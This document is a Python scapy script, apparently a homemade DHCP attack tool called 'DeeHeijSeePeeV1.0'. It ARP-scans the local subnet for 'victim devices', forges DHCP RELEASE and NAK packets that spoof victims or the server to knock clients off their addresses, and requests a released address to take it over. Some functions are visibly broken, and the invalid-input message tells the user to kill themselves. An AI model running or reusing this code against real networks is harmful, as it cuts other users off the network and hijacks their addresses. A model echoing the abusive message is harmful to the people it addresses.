from scapy.all import *
from datetime import datetime
import sys

# Dictionary to store DHCP bindings
dhcp_bindings = {}
dhcp_bindings["aa:aa:aa:aa:aa:aa"] = "192.168.1.150"
DHCP_SERVER_IP_ADDRESS = "192.168.1.150"
def print_banner():
    banner = r"""                                                                                                    
                                                                                    
                                                                                    
                                             @                                      
                                          @@%@                                      
                                         @@%@                                       
                                         @@%@                                       
                                       @@%%%%@                                      
                                      @@%%%%@                                       
                                     @%%%%#%@                                       
                                     @%#*+++*                                       
                                     *++++++*                                       
                                    #+++++++*                                       
                                   %+++++++*%                                       
                                  @*++++++++@                                       
                                  #*++++++++@                                       
                               @*+++++++++++**@                                     
                             #*++++++++++++++++#                                    
                           #*+++++*@##++++++++++*#                                  
                         %**+***#%@%@#++++++++++++##***#*+++*#@%@@                  
                         *+*##***%#%%+++++++++***+++++++++++*%%%%@@                 
                         #+##**#++++++++++++*@%#%#++++++++++*%%%%%@@                
                         @**++%@+++++++++++*@#%%@*++++++++*%   @%%%%@@              
                          @+++%@============@*@@%*++++*%%         @%%@@             
                           *===####@#========+*+==++#               @%@             
                            #=======@%+====+***====+#        @@                     
                             #========+@++#%***+===#     @%####%                    
                             %*++=======##****====@   %%#######%@                   
                            @*+++++++===========#%  @%#######%#%@                   
                           @*++++++++++*#####%@   @%###%%######%                    
                           *+++++++++++++@       %###%#%####*#                      
                          %+++===========+*@    @%########%@                        
                         %++================%     %##%@                             
                         +======*#===*%======%  %#####%                             
                        *=======**===+%=======@%#**#%@                              
                        *=====================+ @#*#%                               
                       %======================+%###@                                
                  #++++========================+*%                                  
                   @%%#*+===========================+*                              
                 @@@@@@%%*==+#%%#====*%#+=====#%%%@@@                               
                                   %# @@   %### @@                                  
                                                                                    
                                                                                    
                                                                                                                                                                  
                       
    """
    print(banner)
    print("DeeHeijSeePeeV1.0\n")
    print("Press S to map MAC addresses on victim devices, H for help, or Q to quit.\n")

def get_mac_from_ip(ip, bindings):
    for mac, bound_ip in bindings.items():
        if bound_ip == ip:
            return mac
    return None  # not found

def forge_false_release(ip_address, number_of_times=1):   
    """
    Forge a DHCP Release packet to drop an IP address.
    """
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
    for _ in range(number_of_times):
        packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
                IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
                UDP(sport=68, dport=67) / \
                    BOOTP(chaddr=mac_address, yiaddr=ip_address, xid=RandInt()) / \
                    DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
        sendp(packet, verbose=False)
        print(f"Sent DHCP Release for {ip_address} from {mac_address}")


def drop_and_mimic(ip_address, number_of_times=1):
    """
    Drop an IP address and craft a DHCPREQUEST to steal the IP address.
    """
    xid = random.randint(1, 0xFFFFFFFF)
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings)
    if not mac_address:
        print(f"MAC address for {ip_address} not found in bindings.")
        return
    mac = get_if_hwaddr(iface)
    forge_false_release(ip_address, number_of_times)
    print(f"Dropped IP {ip_address} for MAC {mac_address} and mimicked DHCP release.") 
    print(f"Attempting to steal IP {ip_address}...")    
    
    dhcp_request = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(mac), xid=xid, flags=0x8000) /
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", DHCP_SERVER_IP_ADDRESS),
            ("requested_addr", ip_address),
            ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
            "end"
        ])
    )

    print(f"Sending DHCPREQUEST for {ip_address} to server...")
    sendp(dhcp_request, iface=iface, verbose=0)

    # Optionally, wait for DHCPACK to confirm
    print("Waiting for DHCPACK...")
    ack = sniff(
        iface=iface,
        filter="udp and (port 67 or 68)",
        stop_filter=lambda p: DHCP in p and p[DHCP].options[0][1] == 5 and p[BOOTP].xid == xid,
        timeout=10
    )

    if ack:
        ack_packet = ack[0]
        print(f"Received DHCPACK: lease confirmed for {ack_packet[BOOTP].yiaddr}")
    else:
        print("No DHCPACK received.")
    
import os
def drop_all_address_in_mimic_table():  
    """
    Attempt to drop all active DHCP requests in the mimic table.
    """
    if not dhcp_bindings:
        print("\nNo DHCP bindings to drop.\n")
        return
    for mac, ip in dhcp_bindings.items():
        forge_false_release(mac, ip)
        print(f"Dropped IP {ip} for MAC {mac}")


def print_help():   
    print("TCP DHCP Releaser Help:")
    print("S - Map TCP connections of other devices")
    print("RA - Release all DHCP bindings")
    print("R - Release a specific IP address (syntax: R -<ip> <param> [-m])")
    print("H - Show this help message")
    print("Q - Quit the program")
    print("\nNote: This tool is designed to work with devices in the same VLAN and requires appropriate permissions to send TCP ACK requests.")


def print_bindings():
    """
    Print the current DHCP bindings in a neat table.
    """
    if not dhcp_bindings:
        print("No DHCP bindings found.\n")
        return

    print("\n{:<4} {:<20} {:<15}".format("No.", "MAC Address", "IP Address"))
    print("-" * 43)
    for idx, (mac, ip) in enumerate(dhcp_bindings.items(), 1):
        print("{:<4} {:<20} {:<15}".format(idx, mac, ip))
    print("-" * 43 + "\n")


def arp_scan_dynamic():
    """
    Perform an ARP scan on the /24 subnet of the current local IP.
    """
    local_ip = get_if_addr(conf.iface)
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip = ".".join(local_ip.split(".")[:3]) + ".0/24"
    print(f"[*] Scanning network: {base_ip}")

    arp = ARP(pdst=base_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=2, verbose=False)[0]

    devices = []
    for sent, received in result:
        dhcp_bindings[received.hwsrc] = received.psrc  # Update DHCP bindings

    return devices

def forge_false_NACK(ip_address, number_of_times=1):
    """
    Forge a DHCP NACK packet to force client to invalidate its IP address.
    """
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings)
    if not mac_address:
        print(f"MAC address for {ip_address} not found in bindings.")
        return

    for i in range(number_of_times):
            # Create BOOTP and DHCP layers separately
            bootp = BOOTP(
                op=2,
                yiaddr="0.0.0.0",
                chaddr=mac2str(mac_address),
                ciaddr=ip_address,
                xid=RandInt()
            )

            dhcp = DHCP(options=[
                ("message-type", "nak"),
                ("server_id", DHCP_SERVER_IP_ADDRESS),
                "end"
            ])

            # Construct full packet
            packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    bootp / dhcp

            # Send packet
            sendp(packet, verbose=1)
            print(f"Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")


def main():
    print_banner()
    print("Press H for help or Q to quit.\n")
    while True:
        choice = input(">> ").strip().upper()
        if choice == "S":
            print("Mapping TCP connections of other devices...")
            arp_scan_dynamic()  
            print("ARP scan completed. Current DHCP bindings:")
            print_bindings()
            # Here you would implement the logic to map TCP connections by sending TCP ACK requests to other user devices found in the VLAN. From the TCP ACK they give back, find their MAC address and associated IP and map it in the dhcp_bindings dictionary.
            
        elif choice == "H":
            print_help()
        elif choice == "Q":
            print("Exiting DHCP Monitor. Goodbye!")
            sys.exit(0)
        elif choice.startswith("R "):
            parts = choice.split()
            if len(parts) >= 3 and parts[1].startswith("-"):
                ip = parts[1][1:]  # Remove the dash
                param = parts[2]
                use_mimic = "-m" in parts

                if use_mimic:
                    try:
                        tries = int(param)
                        drop_and_mimic(ip, tries)
                    except ValueError:
                        if use_mimic:
                            print("Mimicing requires a number of tries.")
                        else:
                            forge_false_release(ip,1)
                else:
                    forge_false_release(ip, param)

                sys.exit(0)
            else:
                print("Invalid syntax. Use: R -<ip> <tryCount> [-m]")
        else:
            print("Invalid choice. Kill yourself \n")

if __name__ == "__main__":
    main()